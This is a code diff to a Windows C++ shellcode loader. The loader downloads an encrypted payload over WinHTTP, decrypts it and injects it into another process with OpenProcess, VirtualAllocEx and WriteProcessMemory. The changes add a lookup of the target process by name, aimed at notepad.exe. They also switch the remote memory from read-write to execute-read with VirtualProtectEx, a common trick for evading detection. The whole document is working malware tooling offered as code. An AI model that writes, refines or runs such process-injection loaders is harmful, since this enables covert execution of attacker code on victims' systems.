@@ -2,6 +2,7 @@
 #pragma once
 #include <Windows.h>
 #include <winhttp.h>
+#include <TlHelp32.h>
 #pragma comment(lib, "winhttp.lib")
 
 typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
@@ -177,6 +178,36 @@ void FreeLib(ChargeDLL* chargeDLL) {
 
 }
 
+DWORD GetProcessIdByName(const wchar_t* processName) {
+    // Take a snapshot of all processes in the system
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        std::cout << "Failed to create process snapshot. Error: " << GetLastError() << "\n";
+        return 0;
+    }
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    // Retrieve information about the first process in the snapshot
+    if (Process32First(hSnapshot, &pe32)) {
+        do {
+            // Compare the process name
+            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
+                // Found the process, return its PID
+                CloseHandle(hSnapshot);
+                return pe32.th32ProcessID;
+            }
+        } while (Process32Next(hSnapshot, &pe32)); // Iterate through the remaining processes
+    }
+
+    // Cleanup
+    CloseHandle(hSnapshot);
+
+    std::cout << "Process not found: " << processName << "\n";
+    return 0; // Process not found
+}
+
 BOOL InjectShellcode(LPVOID payload, SIZE_T payloadSize, DWORD processId) {
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
     if (hProcess == NULL) {
@@ -184,7 +215,7 @@ BOOL InjectShellcode(LPVOID payload, SIZE_T payloadSize, DWORD processId) {
         return FALSE;
     }
 
-    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (remoteMemory == NULL) {
         //printf("Erreur VirtualAllocEx: %lu\n", GetLastError());
         CloseHandle(hProcess);
@@ -194,6 +225,15 @@ BOOL InjectShellcode(LPVOID payload, SIZE_T payloadSize, DWORD processId) {
     SIZE_T bytesWritten;
     if (!WriteProcessMemory(hProcess, remoteMemory, payload, payloadSize, &bytesWritten)) {
         //printf("Erreur WriteProcessMemory: %lu\n", GetLastError());
+        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    // Change memory permissions to PAGE_EXECUTE_READ
+    DWORD oldProtect;
+    if (!VirtualProtectEx(hProcess, remoteMemory, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
+        std::cout << "VirtualProtectEx failed. Error: " << GetLastError() << "\n";
         VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         return FALSE;
@@ -315,12 +355,6 @@ int main()
 
     if (!bResults) std::cout << "Error " << GetLastError() << " has occurred.\n";
 
-    void* addr = chargeDLL.pVirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (addr == 0) {
-        return 1;
-    }
-    size_t bytesWritten = 0;
-
 
     const size_t SHELLCODE_SIZE = sPayloadSize + 1; //sizeof(shell);
 
@@ -335,13 +369,18 @@ int main()
         //printf("/%x", decryptedPayload[i]);
     };
 
-    DWORD pid = 27132;
+    // Resolve the PID dynamically for a process name
+    const wchar_t* targetProcessName = L"notepad.exe";
+    DWORD pid = GetProcessIdByName(targetProcessName);
+
+    if (pid == 0) {
+        std::cout << "Target process not found.\n";
+        return 1; // Exit if process is not found
+    }
 
     InjectShellcode(decryptedPayload, SHELLCODE_SIZE, pid);
 
     Sleep(10000);
-
-    chargeDLL.pVirtualFree(addr, 0, MEM_RELEASE);
 
     // Libérer les DLL
     FreeLib(&chargeDLL);
